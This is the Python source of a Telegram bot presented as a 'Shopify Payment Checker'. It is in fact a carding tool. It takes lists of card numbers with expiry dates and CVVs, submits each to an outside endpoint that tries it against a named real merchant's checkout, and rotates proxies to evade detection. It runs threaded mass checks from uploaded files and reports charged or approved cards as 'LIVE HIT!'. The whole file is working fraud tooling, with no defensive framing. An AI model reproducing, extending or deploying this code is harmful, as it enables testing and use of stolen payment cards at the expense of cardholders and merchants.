#!/usr/bin/env python3
"""
Shopify Payment Checker Bot v2.1
Telegram Bot for Railway Deployment (Polling Mode)
No hardcoded token - reads from environment variable
"""

import os
import sys
import re
import json
import time
import random
import requests
import threading
from datetime import datetime
from typing import Dict, Optional, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# Telegram Bot API
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== CONFIGURATION =====
# Read from environment variables (set in Railway dashboard)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "")

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN environment variable not set!")
    print("ℹ️  Set it in Railway Dashboard → Variables")
    sys.exit(1)

# Parse admin IDs
admin_ids = []
if ADMIN_IDS:
    try:
        admin_ids = [int(x.strip()) for x in ADMIN_IDS.split(",")]
    except:
        pass

# ===== SYMBOLS =====
CHECK = "✅"
CROSS = "❌"
WARNING = "⚠️"
ARROW = "➜"
STAR = "⭐"
INFO = "ℹ️"
CARD = "💳"
LIGHTNING = "⚡"
GEAR = "⚙️"
HEART = "❤️"
MONEY = "💰"
SHOPIFY_ICON = "🛒"
PROXY_ICON = "🌐"
MASS = "📊"
LOCK = "🔒"
HOURGLASS = "⏳"
BOT_ICON = "🤖"

# ===== BOT INITIALIZATION =====
bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

# ===== PROXY MANAGEMENT =====
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.failed_proxies = set()
        self.lock = threading.Lock()

    def load_proxies(self, file_path: str) -> int:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        self.proxies.append(proxy)
            return len(self.proxies)
        except Exception as e:
            print(f"{CROSS} Error loading proxies: {e}")
            return 0

    def add_proxy(self, proxy: str):
        if proxy and proxy not in self.proxies:
            with self.lock:
                self.proxies.append(proxy)

    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None

        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1

                if proxy in self.failed_proxies:
                    attempts += 1
                    continue

                return proxy

            self.failed_proxies.clear()
            if self.proxies:
                return self.proxies[0]
            return None

    def mark_failed(self, proxy: str):
        if proxy:
            with self.lock:
                self.failed_proxies.add(proxy)

    def get_count(self):
        return len(self.proxies)

    def clear(self):
        with self.lock:
            self.proxies.clear()
            self.failed_proxies.clear()
            self.current_index = 0

# Global proxy manager
proxy_manager = ProxyManager()

# ===== USER SESSIONS =====
user_sessions = {}
user_files = {}

# ===== HELPER FUNCTIONS =====
def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    card_str = card_str.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_str)
        if match:
            card, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 2:
                year = f"20{year}"
            return card, month, year, cvv
    return None

def mask_card(card: str) -> str:
    if len(card) >= 10:
        return card[:6] + "******" + card[-4:]
    return card

def extract_cards(text: str) -> List[str]:
    cards = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            parsed = parse_card(line)
            if parsed:
                card, month, year, cvv = parsed
                cards.append(f"{card}|{month}|{year}|{cvv}")
    return list(dict.fromkeys(cards))

def check_card(card: str, use_proxy: bool = True) -> Dict:
    """Check a single card using Shopify API"""
    try:
        card_number, exp_month, exp_year, cvv = card.split('|')

        url = "https://web-production-669be.up.railway.app/shopify"

        proxy = None
        if use_proxy:
            proxy = proxy_manager.get_proxy()

        params = {
            "site": "https://the3doodler.com/",
            "cc": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
        }

        if proxy:
            params["proxy"] = proxy

        start_time = time.time()
        response = requests.get(url, params=params, timeout=30)
        elapsed = time.time() - start_time

        if response.status_code == 200:
            try:
                data = response.json()

                status = data.get('Status', False)
                gateway = data.get('Gateway', 'Unknown')
                price = data.get('Price', 'N/A')
                response_msg = data.get('Response', 'Unknown')
                time_taken = data.get('Time', f'{elapsed:.2f}s')

                response_lower = str(response_msg).lower()

                if status == True:
                    status_type = 'CHARGED'
                    status_icon = CHECK
                elif 'approved' in response_lower:
                    status_type = 'APPROVED'
                    status_icon = CHECK
                elif 'order_placed' in response_lower or 'order_place' in response_lower:
                    status_type = 'ORDER_PLACED'
                    status_icon = CHECK
                elif '3ds' in response_lower or '3d_secure' in response_lower:
                    status_type = '3DS_REQUIRED'
                    status_icon = LOCK
                elif 'declined' in response_lower or 'card_declined' in response_lower:
                    status_type = 'DECLINED'
                    status_icon = CROSS
                else:
                    status_type = 'UNKNOWN'
                    status_icon = WARNING

                return {
                    'card': card,
                    'status': status_type,
                    'status_bool': status,
                    'gateway': gateway,
                    'price': price,
                    'response': response_msg,
                    'time': time_taken,
                    'proxy': proxy,
                    'status_icon': status_icon
                }

            except json.JSONDecodeError:
                return {
                    'card': card,
                    'status': 'ERROR',
                    'status_bool': False,
                    'gateway': 'Unknown',
                    'price': 'N/A',
                    'response': 'Invalid JSON response',
                    'time': f'{elapsed:.2f}s',
                    'proxy': proxy,
                    'status_icon': CROSS
                }
        else:
            if proxy:
                proxy_manager.mark_failed(proxy)
            return {
                'card': card,
                'status': 'ERROR',
                'status_bool': False,
                'gateway': 'Unknown',
                'price': 'N/A',
                'response': f'HTTP {response.status_code}',
                'time': f'{elapsed:.2f}s',
                'proxy': proxy,
                'status_icon': CROSS
            }

    except requests.exceptions.ProxyError:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': card,
            'status': 'ERROR',
            'status_bool': False,
            'gateway': 'Unknown',
            'price': 'N/A',
            'response': 'Proxy Error',
            'time': 'N/A',
            'proxy': proxy,
            'status_icon': CROSS
        }
    except requests.exceptions.Timeout:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': card,
            'status': 'ERROR',
            'status_bool': False,
            'gateway': 'Unknown',
            'price': 'N/A',
            'response': 'Timeout',
            'time': 'N/A',
            'proxy': proxy,
            'status_icon': CROSS
        }
    except Exception as e:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': card,
            'status': 'ERROR',
            'status_bool': False,
            'gateway': 'Unknown',
            'price': 'N/A',
            'response': str(e)[:50],
            'time': 'N/A',
            'proxy': proxy,
            'status_icon': CROSS
        }

# ===== KEYBOARDS =====
def get_main_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton(f"{CARD} Single Check"),
        KeyboardButton(f"{MASS} Bulk Check"),
        KeyboardButton(f"{PROXY_ICON} Proxy Manager"),
        KeyboardButton(f"{INFO} Help"),
        KeyboardButton(f"{GEAR} Settings"),
        KeyboardButton(f"{HEART} Status")
    )
    return markup

def get_proxy_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton(f"📁 Load from File"),
        KeyboardButton(f"➕ Add Proxy"),
        KeyboardButton(f"📋 View Proxies"),
        KeyboardButton(f"🗑️ Clear All"),
        KeyboardButton(f"🧪 Test Proxies"),
        KeyboardButton(f"🔙 Back")
    )
    return markup

def get_settings_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton(f"🔄 Toggle Proxy"),
        KeyboardButton(f"🔢 Set Threads"),
        KeyboardButton(f"🔙 Back")
    )
    return markup

# ===== COMMAND HANDLERS =====
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id

    welcome_text = f"""
{BOT_ICON} <b>Welcome to Shopify Checker Bot!</b> {BOT_ICON}

{CARD} <b>Features:</b>
• Single Card Check
• Bulk Card Check  
• Mass Check with Threads
• Proxy Support (HTTP/SOCKS5)
• Auto Proxy Rotation
• Failed Proxy Tracking

{ARROW} <b>Commands:</b>
/start - Start the bot
/help - Show this help
/check - Single card check
/bulk - Bulk card check
/mass - Mass check from file
/proxy - Proxy management
/status - Bot status

{PROXY_ICON} <b>Proxy Status:</b> {'Enabled' if proxy_manager.get_count() > 0 else 'No proxies loaded'}

{INFO} Send cards in format: <code>card|mm|yy|cvv</code>
"""

    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )

@bot.message_handler(commands=['status'])
def send_status(message):
    status_text = f"""
{GEAR} <b>Bot Status</b> {GEAR}

{PROXY_ICON} <b>Proxies:</b> {proxy_manager.get_count()} loaded
{HEART} <b>Failed Proxies:</b> {len(proxy_manager.failed_proxies)}
{INFO} <b>Active Users:</b> {len(user_sessions)}
{STAR} <b>Mode:</b> Polling (Railway)

{BOT_ICON} <b>Bot is Online!</b>
"""
    bot.send_message(message.chat.id, status_text, parse_mode='HTML')

# ===== MAIN MENU HANDLERS =====
@bot.message_handler(func=lambda message: message.text and f"{CARD} Single Check" in message.text)
def handle_single_check_menu(message):
    user_sessions[message.from_user.id] = {'mode': 'single'}
    msg = bot.send_message(
        message.chat.id,
        f"{CARD} <b>Single Card Check</b>\n\n"
        f"{ARROW} Send card in format:\n"
        f"<code>4972039707804898|06|2028|853</code>\n\n"
        f"{INFO} Or use /cancel to go back",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_single_check)

@bot.message_handler(func=lambda message: message.text and f"{MASS} Bulk Check" in message.text)
def handle_bulk_check_menu(message):
    user_sessions[message.from_user.id] = {'mode': 'bulk'}
    msg = bot.send_message(
        message.chat.id,
        f"{MASS} <b>Bulk Card Check</b>\n\n"
        f"{ARROW} Send cards (one per line):\n"
        f"<code>4972039707804898|06|2028|853</code>\n"
        f"<code>4111111111111111|12|2025|123</code>\n\n"
        f"{INFO} Send 'done' when finished or /cancel to go back",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_bulk_check)

@bot.message_handler(func=lambda message: message.text and f"{PROXY_ICON} Proxy Manager" in message.text)
def handle_proxy_menu(message):
    bot.send_message(
        message.chat.id,
        f"{PROXY_ICON} <b>Proxy Management</b>",
        parse_mode='HTML',
        reply_markup=get_proxy_keyboard()
    )

@bot.message_handler(func=lambda message: message.text and f"{INFO} Help" in message.text)
def handle_help_menu(message):
    send_welcome(message)

@bot.message_handler(func=lambda message: message.text and f"{GEAR} Settings" in message.text)
def handle_settings_menu(message):
    user_id = message.from_user.id
    use_proxy = user_sessions.get(user_id, {}).get('use_proxy', True)
    threads = user_sessions.get(user_id, {}).get('threads', 5)

    settings_text = f"""
{GEAR} <b>Settings</b> {GEAR}

{PROXY_ICON} <b>Use Proxy:</b> {'✅ Yes' if use_proxy else '❌ No'}
{GEAR} <b>Threads:</b> {threads}

{ARROW} Select option below:
"""
    bot.send_message(
        message.chat.id,
        settings_text,
        parse_mode='HTML',
        reply_markup=get_settings_keyboard()
    )

@bot.message_handler(func=lambda message: message.text and f"{HEART} Status" in message.text)
def handle_status_menu(message):
    send_status(message)

# ===== PROCESSING FUNCTIONS =====
def process_single_check(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "Cancelled!", reply_markup=get_main_keyboard())
        return

    card_input = message.text.strip()
    parsed = parse_card(card_input)

    if not parsed:
        msg = bot.send_message(
            message.chat.id,
            f"{CROSS} <b>Invalid format!</b>\n\n"
            f"{ARROW} Use: <code>card|mm|yy|cvv</code>\n"
            f"{ARROW} Example: <code>4972039707804898|06|2028|853</code>\n\n"
            f"{INFO} Try again or /cancel",
            parse_mode='HTML'
        )
        bot.register_next_step_handler(msg, process_single_check)
        return

    # Send processing message
    processing_msg = bot.send_message(
        message.chat.id,
        f"{HOURGLASS} <b>Checking card...</b>\n"
        f"{CARD} <code>{mask_card(parsed[0])}|{parsed[1]}|{parsed[2]}|{parsed[3]}</code>",
        parse_mode='HTML'
    )

    use_proxy = user_sessions.get(message.from_user.id, {}).get('use_proxy', True)
    result = check_card(card_input, use_proxy=use_proxy)

    parts = card_input.split('|')
    masked = mask_card(parts[0])

    result_text = f"""
{'═'*40}
{CARD} <b>Card:</b> <code>{masked}|{parts[1]}|{parts[2]}|{parts[3]}</code>
{MONEY} <b>Price:</b> ${result['price']}
{SHOPIFY_ICON} <b>Gateway:</b> {result['gateway']}
{result['status_icon']} <b>Status:</b> <b>{result['status']}</b>
{INFO} <b>Response:</b> {result['response']}
{HOURGLASS} <b>Time:</b> {result['time']}
"""

    if result.get('proxy'):
        result_text += f"{PROXY_ICON} <b>Proxy:</b> <code>{result['proxy']}</code>\n"

    result_text += f"{'═'*40}"

    bot.delete_message(message.chat.id, processing_msg.message_id)
    bot.send_message(message.chat.id, result_text, parse_mode='HTML', reply_markup=get_main_keyboard())

def process_bulk_check(message):
    user_id = message.from_user.id

    if message.text == '/cancel':
        bot.send_message(message.chat.id, "Cancelled!", reply_markup=get_main_keyboard())
        if user_id in user_files:
            del user_files[user_id]
        return

    if message.text.lower() == 'done':
        if user_id not in user_files or not user_files[user_id]:
            bot.send_message(message.chat.id, f"{CROSS} No cards entered!", reply_markup=get_main_keyboard())
            return

        cards = user_files[user_id]
        del user_files[user_id]

        # Start bulk processing
        process_bulk_cards(message.chat.id, user_id, cards)
        return

    parsed = parse_card(message.text.strip())
    if not parsed:
        msg = bot.send_message(
            message.chat.id,
            f"{CROSS} Invalid format! Try again or send 'done' to finish",
            reply_markup=get_main_keyboard()
        )
        bot.register_next_step_handler(msg, process_bulk_check)
        return

    if user_id not in user_files:
        user_files[user_id] = []

    card_str = f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}"
    user_files[user_id].append(card_str)

    msg = bot.send_message(
        message.chat.id,
        f"{CHECK} Card added! ({len(user_files[user_id])} total)\n"
        f"{ARROW} Send next card or 'done' to start checking",
        reply_markup=get_main_keyboard()
    )
    bot.register_next_step_handler(msg, process_bulk_check)

def process_bulk_cards(chat_id, user_id, cards):
    use_proxy = user_sessions.get(user_id, {}).get('use_proxy', True)

    # Send initial status
    status_msg = bot.send_message(
        chat_id,
        f"{GEAR} <b>Processing {len(cards)} cards...</b>\n"
        f"{HOURGLASS} Please wait...",
        parse_mode='HTML'
    )

    results = []
    charged = []
    start = time.time()

    for i, card in enumerate(cards, 1):
        result = check_card(card, use_proxy=use_proxy)
        results.append(result)

        if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
            charged.append(card)

        # Update status every 5 cards
        if i % 5 == 0 or i == len(cards):
            try:
                bot.edit_message_text(
                    f"{GEAR} <b>Processing...</b>\n"
                    f"{INFO} Progress: {i}/{len(cards)}\n"
                    f"{CHECK} Approved: {len(charged)}\n"
                    f"{HOURGLASS} Please wait...",
                    chat_id,
                    status_msg.message_id,
                    parse_mode='HTML'
                )
            except:
                pass

        time.sleep(0.3)

    elapsed = time.time() - start
    charged_count = len(charged)
    total = len(cards)

    # Build result text
    result_text = f"""
{STAR} <b>BULK CHECK SUMMARY</b> {STAR}

{CHECK} <b>Charged/Approved:</b> {charged_count}/{total}
{LOCK} <b>3DS Required:</b> {sum(1 for r in results if r['status'] == '3DS_REQUIRED')}/{total}
{CROSS} <b>Declined/Error:</b> {total - charged_count}/{total}
{HOURGLASS} <b>Time:</b> {elapsed:.2f}s
"""

    if charged:
        result_text += f"\n{HEART} <b>Successful Cards:</b>\n"
        for c in charged[:10]:  # Show max 10
            parts = c.split('|')
            result_text += f"{CHECK} <code>{mask_card(parts[0])}|{parts[1]}|{parts[2]}|{parts[3]}</code>\n"
        if len(charged) > 10:
            result_text += f"{INFO} ... and {len(charged) - 10} more\n"

    bot.delete_message(chat_id, status_msg.message_id)
    bot.send_message(chat_id, result_text, parse_mode='HTML', reply_markup=get_main_keyboard())

# ===== PROXY MANAGEMENT HANDLERS =====
@bot.message_handler(func=lambda message: message.text and "📁 Load from File" in message.text)
def handle_proxy_file(message):
    msg = bot.send_message(
        message.chat.id,
        f"{PROXY_ICON} <b>Load Proxies from File</b>\n\n"
        f"{ARROW} Send proxy file or paste proxies (one per line)\n"
        f"{INFO} Supported formats:\n"
        f"<code>http://user:pass@ip:port</code>\n"
        f"<code>socks5://user:pass@ip:port</code>\n"
        f"<code>ip:port</code>",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_proxy_file)

def process_proxy_file(message):
    if message.document:
        # Download file
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            content = downloaded_file.decode('utf-8')
        except Exception as e:
            bot.send_message(message.chat.id, f"{CROSS} Error reading file: {e}", reply_markup=get_proxy_keyboard())
            return
    else:
        content = message.text

    lines = content.strip().split('\n')
    added = 0
    for line in lines:
        proxy = line.strip()
        if proxy and not proxy.startswith('#'):
            proxy_manager.add_proxy(proxy)
            added += 1

    bot.send_message(
        message.chat.id,
        f"{CHECK} <b>Loaded {added} proxies!</b>\n"
        f"{INFO} Total proxies: {proxy_manager.get_count()}",
        parse_mode='HTML',
        reply_markup=get_proxy_keyboard()
    )

@bot.message_handler(func=lambda message: message.text and "➕ Add Proxy" in message.text)
def handle_add_proxy(message):
    msg = bot.send_message(
        message.chat.id,
        f"{PROXY_ICON} <b>Add Single Proxy</b>\n\n"
        f"{ARROW} Send proxy in format:\n"
        f"<code>http://user:pass@192.168.1.1:8080</code>\n"
        f"<code>socks5://user:pass@192.168.1.1:1080</code>\n"
        f"<code>192.168.1.1:8080</code>",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_add_proxy)

def process_add_proxy(message):
    proxy = message.text.strip()
    if proxy:
        proxy_manager.add_proxy(proxy)
        bot.send_message(
            message.chat.id,
            f"{CHECK} <b>Proxy added!</b>\n"
            f"{PROXY_ICON} <code>{proxy}</code>\n"
            f"{INFO} Total: {proxy_manager.get_count()}",
            parse_mode='HTML',
            reply_markup=get_proxy_keyboard()
        )
    else:
        bot.send_message(message.chat.id, f"{CROSS} Invalid proxy!", reply_markup=get_proxy_keyboard())

@bot.message_handler(func=lambda message: message.text and "📋 View Proxies" in message.text)
def handle_view_proxies(message):
    if not proxy_manager.proxies:
        bot.send_message(message.chat.id, f"{WARNING} No proxies loaded!", reply_markup=get_proxy_keyboard())
        return

    proxy_text = f"{PROXY_ICON} <b>Proxy List ({proxy_manager.get_count()} total)</b>\n\n"
    for i, proxy in enumerate(proxy_manager.proxies[:20], 1):
        status = "❌" if proxy in proxy_manager.failed_proxies else "✅"
        proxy_text += f"{i}. {status} <code>{proxy}</code>\n"

    if len(proxy_manager.proxies) > 20:
        proxy_text += f"\n... and {len(proxy_manager.proxies) - 20} more"

    bot.send_message(message.chat.id, proxy_text, parse_mode='HTML', reply_markup=get_proxy_keyboard())

@bot.message_handler(func=lambda message: message.text and "🗑️ Clear All" in message.text)
def handle_clear_proxies(message):
    proxy_manager.clear()
    bot.send_message(
        message.chat.id,
        f"{CHECK} <b>All proxies cleared!</b>",
        parse_mode='HTML',
        reply_markup=get_proxy_keyboard()
    )

@bot.message_handler(func=lambda message: message.text and "🧪 Test Proxies" in message.text)
def handle_test_proxies(message):
    if not proxy_manager.proxies:
        bot.send_message(message.chat.id, f"{WARNING} No proxies to test!", reply_markup=get_proxy_keyboard())
        return

    status_msg = bot.send_message(message.chat.id, f"{HOURGLASS} <b>Testing proxies...</b>", parse_mode='HTML')

    working = 0
    results_text = f"{GEAR} <b>Proxy Test Results</b>\n\n"

    for proxy in proxy_manager.proxies[:10]:
        try:
            response = requests.get(
                'https://httpbin.org/ip',
                proxies={'http': proxy, 'https': proxy},
                timeout=5
            )
            if response.status_code == 200:
                results_text += f"{CHECK} <code>{proxy}</code>\n"
                working += 1
            else:
                results_text += f"{CROSS} <code>{proxy}</code>\n"
                proxy_manager.mark_failed(proxy)
        except:
            results_text += f"{CROSS} <code>{proxy}</code>\n"
            proxy_manager.mark_failed(proxy)

    results_text += f"\n{INFO} <b>Working: {working}/{min(10, len(proxy_manager.proxies))}</b>"

    bot.delete_message(message.chat.id, status_msg.message_id)
    bot.send_message(message.chat.id, results_text, parse_mode='HTML', reply_markup=get_proxy_keyboard())

@bot.message_handler(func=lambda message: message.text and "🔙 Back" in message.text)
def handle_back(message):
    bot.send_message(
        message.chat.id,
        f"{BOT_ICON} <b>Main Menu</b>",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )

# ===== SETTINGS HANDLERS =====
@bot.message_handler(func=lambda message: message.text and "🔄 Toggle Proxy" in message.text)
def handle_toggle_proxy(message):
    user_id = message.from_user.id
    current = user_sessions.get(user_id, {}).get('use_proxy', True)
    user_sessions[user_id] = user_sessions.get(user_id, {})
    user_sessions[user_id]['use_proxy'] = not current

    status = "✅ Enabled" if not current else "❌ Disabled"
    bot.send_message(
        message.chat.id,
        f"{PROXY_ICON} <b>Proxy usage {status}</b>",
        parse_mode='HTML',
        reply_markup=get_settings_keyboard()
    )

@bot.message_handler(func=lambda message: message.text and "🔢 Set Threads" in message.text)
def handle_set_threads(message):
    msg = bot.send_message(
        message.chat.id,
        f"{GEAR} <b>Set Threads</b>\n\n"
        f"{ARROW} Enter number of threads (1-20):",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_set_threads)

def process_set_threads(message):
    try:
        threads = int(message.text.strip())
        threads = max(1, min(20, threads))
        user_id = message.from_user.id
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]['threads'] = threads

        bot.send_message(
            message.chat.id,
            f"{CHECK} <b>Threads set to {threads}</b>",
            parse_mode='HTML',
            reply_markup=get_settings_keyboard()
        )
    except:
        bot.send_message(message.chat.id, f"{CROSS} Invalid number!", reply_markup=get_settings_keyboard())

# ===== MASS CHECK FROM FILE =====
@bot.message_handler(commands=['mass'])
def handle_mass_command(message):
    user_sessions[message.from_user.id] = {'mode': 'mass'}
    msg = bot.send_message(
        message.chat.id,
        f"{MASS} <b>Mass Check from File</b>\n\n"
        f"{ARROW} Send file with cards (one per line)\n"
        f"{INFO} Format: <code>card|mm|yy|cvv</code>\n\n"
        f"{GEAR} Threads: {user_sessions.get(message.from_user.id, {}).get('threads', 5)}",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(func=lambda message: message.text and f"{MASS} Bulk Check" in message.text)
def handle_mass_menu(message):
    handle_mass_command(message)

def process_mass_file(message):
    if not message.document:
        bot.send_message(message.chat.id, f"{CROSS} Please send a file!", reply_markup=get_main_keyboard())
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8')
    except Exception as e:
        bot.send_message(message.chat.id, f"{CROSS} Error: {e}", reply_markup=get_main_keyboard())
        return

    cards = extract_cards(content)

    if not cards:
        bot.send_message(message.chat.id, f"{CROSS} No valid cards found!", reply_markup=get_main_keyboard())
        return

    user_id = message.from_user.id
    max_workers = user_sessions.get(user_id, {}).get('threads', 5)
    use_proxy = user_sessions.get(user_id, {}).get('use_proxy', True)

    # Send initial status
    status_msg = bot.send_message(
        message.chat.id,
        f"{MASS} <b>Mass Check Started</b>\n"
        f"{INFO} Cards: {len(cards)}\n"
        f"{GEAR} Threads: {max_workers}\n"
        f"{HOURGLASS} Processing...",
        parse_mode='HTML'
    )

    results = []
    charged = []
    start = time.time()
    processed = 0

    def update_status():
        while processed < len(cards):
            try:
                bot.edit_message_text(
                    f"{MASS} <b>Mass Check Running</b>\n"
                    f"{INFO} Progress: {processed}/{len(cards)}\n"
                    f"{CHECK} Approved: {len(charged)}\n"
                    f"{HOURGLASS} Please wait...",
                    message.chat.id,
                    status_msg.message_id,
                    parse_mode='HTML'
                )
            except:
                pass
            time.sleep(2)

    # Start status updater thread
    status_thread = threading.Thread(target=update_status)
    status_thread.daemon = True
    status_thread.start()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_card, card, use_proxy): card for card in cards}

        for future in as_completed(futures):
            card = futures[future]
            try:
                result = future.result(timeout=60)
                results.append(result)
                processed += 1

                if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
                    charged.append(card)
                    # Send live hit notification
                    parts = card.split('|')
                    hit_text = f"""
{HEART} <b>LIVE HIT!</b> {HEART}

{CARD} <code>{mask_card(parts[0])}|{parts[1]}|{parts[2]}|{parts[3]}</code>
{MONEY} <b>Price:</b> ${result['price']}
{result['status_icon']} <b>Status:</b> {result['status']}
{INFO} <b>Response:</b> {result['response']}
"""
                    bot.send_message(message.chat.id, hit_text, parse_mode='HTML')

            except Exception as e:
                processed += 1
                results.append({
                    'card': card,
                    'status': 'ERROR',
                    'response': str(e)[:50]
                })

    elapsed = time.time() - start
    charged_count = len(charged)
    total = len(cards)

    # Final summary
    result_text = f"""
{STAR} <b>MASS CHECK COMPLETE</b> {STAR}

{CHECK} <b>Charged/Approved:</b> {charged_count}/{total}
{LOCK} <b>3DS Required:</b> {sum(1 for r in results if r.get('status') == '3DS_REQUIRED')}/{total}
{CROSS} <b>Declined/Error:</b> {total - charged_count}/{total}
{HOURGLASS} <b>Total Time:</b> {elapsed:.2f}s
{INFO} <b>Average:</b> {elapsed/total:.2f}s per card
"""

    if charged:
        result_text += f"\n{HEART} <b>All Hits:</b>\n"
        for c in charged[:20]:
            parts = c.split('|')
            result_text += f"{CHECK} <code>{mask_card(parts[0])}|{parts[1]}|{parts[2]}|{parts[3]}</code>\n"
        if len(charged) > 20:
            result_text += f"{INFO} ... and {len(charged) - 20} more\n"

    try:
        bot.delete_message(message.chat.id, status_msg.message_id)
    except:
        pass

    bot.send_message(message.chat.id, result_text, parse_mode='HTML', reply_markup=get_main_keyboard())

# ===== MAIN =====
if __name__ == "__main__":
    print(f"{BOT_ICON} Starting Shopify Checker Bot...")
    print(f"{INFO} Mode: Polling (Railway compatible)")
    print(f"{INFO} Token source: Environment Variable")

    try:
        bot_info = bot.get_me()
        print(f"{CHECK} Bot connected: @{bot_info.username}")
        print(f"{CHECK} Bot ID: {bot_info.id}")
    except Exception as e:
        print(f"{CROSS} Failed to connect: {e}")
        sys.exit(1)

    print(f"{PROXY_ICON} Proxies: {proxy_manager.get_count()}")
    print(f"{STAR} Starting polling...")

    # Start polling (no webhook needed)
    bot.polling(none_stop=True, interval=0, timeout=20)
